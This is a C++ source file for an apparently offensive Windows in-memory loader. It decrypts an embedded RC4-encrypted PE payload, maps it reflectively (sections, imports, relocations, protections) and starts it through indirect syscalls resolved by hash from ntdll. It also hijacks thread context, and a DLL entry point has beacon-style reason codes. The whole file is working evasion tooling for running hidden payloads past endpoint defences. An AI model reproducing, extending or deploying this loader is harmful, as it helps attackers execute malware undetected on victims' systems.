#include <iostream>

#include "Common.h"

#include "Reflective.h"
#include "Structs.h"
#include "Payload.h"
#include "Hooks.h"

bool ResolveSyscalls(
	_In_	PSYSCALL	pSyscall
)
{
	void* pNtdll = Win32::RtlGetModuleAddressWithHash(ctime_HashStrA("ntdll.dll"));

	if (!RESOLVE_SYSCALL(pNtdll, NtAllocateVirtualMemory))	{ return false; }
	if (!RESOLVE_SYSCALL(pNtdll, NtProtectVirtualMemory))	{ return false; }
	if (!RESOLVE_SYSCALL(pNtdll, NtFreeVirtualMemory))		{ return false; }
	if (!RESOLVE_SYSCALL(pNtdll, NtCreateThreadEx))			{ return false; }
	if (!RESOLVE_SYSCALL(pNtdll, NtGetContextThread))		{ return false; }
	if (!RESOLVE_SYSCALL(pNtdll, NtSetContextThread))		{ return false; }
	if (!RESOLVE_SYSCALL(pNtdll, NtResumeThread))			{ return false; }
	if (!RESOLVE_SYSCALL(pNtdll, NtWaitForSingleObject))	{ return false; }

	return true;
}

int Run()
{
	std::string PeArgs = "coffee exit";

    SYSCALL SyscallList = { 0 };
    ResolveSyscalls(&SyscallList);


	InitArgs(const_cast<char*>(PeArgs.c_str()));

	USTRING uKey = { 0 };
	USTRING uPayload = { 0 };

	void* peContent = RemovePadding(reinterpret_cast<unsigned char*>(&payload), sizeof(payload), REAL_SIZE);

	uPayload.Buffer = reinterpret_cast<unsigned char*>(peContent);
	uPayload.Length = uPayload.MaximumLength = REAL_SIZE;

	uKey.Buffer = reinterpret_cast<unsigned char*>(&key);
	uKey.Length = uKey.MaximumLength = 16;


	SystemFunction032(&uPayload, &uKey);

	PIMAGE_NT_HEADERS pPayloadNtHeaders = Win32::RtlGetImageNtHeaders(peContent);
	size_t			peImageSize = pPayloadNtHeaders->OptionalHeader.SizeOfImage;
	void* MemoryPeAddr = nullptr;

	// Allocate memory for PE
	IndirectSyscall::Prepare(SyscallList.NtAllocateVirtualMemory.Jmp, SyscallList.NtAllocateVirtualMemory.SyscallId);
	NTSTATUS status = IndirectSyscall::Call(NtCurrentProcess, &MemoryPeAddr, 0, &peImageSize, MEM_COMMIT, PAGE_READWRITE);
	if (NT_ERROR(status))
	{
		return EXIT_FAILURE;
	}


#ifdef _DEBUG
	printf("[*] Allocated memory for PE : 0x%p\n", MemoryPeAddr);
#endif

	// Copy section
	Reflective::CopySections(MemoryPeAddr, pPayloadNtHeaders, peContent);

	// IAT Patch
	if (!Reflective::ProcessImportTable(MemoryPeAddr, pPayloadNtHeaders))
	{
		return EXIT_FAILURE;
	}

	// Patch reloc
	Reflective::ApplyBaseRelocations(MemoryPeAddr, pPayloadNtHeaders);

	//Patch memory protection
	if (!Reflective::PatchMemoryProtection(MemoryPeAddr, pPayloadNtHeaders, &SyscallList.NtProtectVirtualMemory))
	{
		return EXIT_FAILURE;
	}

	auto PeEntryPoint = reinterpret_cast<char*>(MemoryPeAddr) + pPayloadNtHeaders->OptionalHeader.AddressOfEntryPoint;

	HANDLE hThread = nullptr;
	IndirectSyscall::Prepare(SyscallList.NtCreateThreadEx.Jmp, SyscallList.NtCreateThreadEx.SyscallId);
	status = IndirectSyscall::Call(&hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, NtCurrentProcess, PeEntryPoint, 0, 1, NULL, 0, 0, NULL);
	if (NT_ERROR(status))
	{
		return EXIT_FAILURE;
	}

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;

	IndirectSyscall::Prepare(SyscallList.NtGetContextThread.Jmp, SyscallList.NtGetContextThread.SyscallId);
	status = IndirectSyscall::Call(hThread, &ctx);
	if (NT_ERROR(status))
	{
		return EXIT_FAILURE;
	}

	ctx.Rip = reinterpret_cast<unsigned long long>(PeEntryPoint);

	IndirectSyscall::Prepare(SyscallList.NtSetContextThread.Jmp, SyscallList.NtSetContextThread.SyscallId);
	status = IndirectSyscall::Call(hThread, &ctx);
	if (NT_ERROR(status))
	{
		return EXIT_FAILURE;
	}

	IndirectSyscall::Prepare(SyscallList.NtResumeThread.Jmp, SyscallList.NtResumeThread.SyscallId);
	status = IndirectSyscall::Call(hThread, nullptr);
	if (NT_ERROR(status))
	{
		return EXIT_FAILURE;
	}

#ifdef _DEBUG
	printf("[*] Start address : %p\n", PeEntryPoint);
#endif

	IndirectSyscall::Prepare(SyscallList.NtWaitForSingleObject.Jmp, SyscallList.NtWaitForSingleObject.SyscallId);
	status = IndirectSyscall::Call(hThread, FALSE, nullptr);
	if (NT_ERROR(status))
	{
		return EXIT_FAILURE;
	}

#ifdef _DEBUG
	printf("[*] Success !\n");
#endif
	return EXIT_SUCCESS;

}


#ifdef DLL

__declspec(dllexport) bool WINAPI DllMain
(
	_In_	HINSTANCE	hinstDLL,
	_In_	DWORD		fdwReason,
	_In_	LPVOID		lpvReserved
)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		return true;
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_THREAD_DETACH:
		break;

	case 0x4:
		Run();
		break;

	case 0x0d:	//  DLL_BEACON_USER_DATA
		break;

	case DLL_PROCESS_DETACH:
		if (lpvReserved != nullptr)
		{
			break;
		}

		break;
	}
	return true;
}

#else

int main()
{
	Run();
}

#endif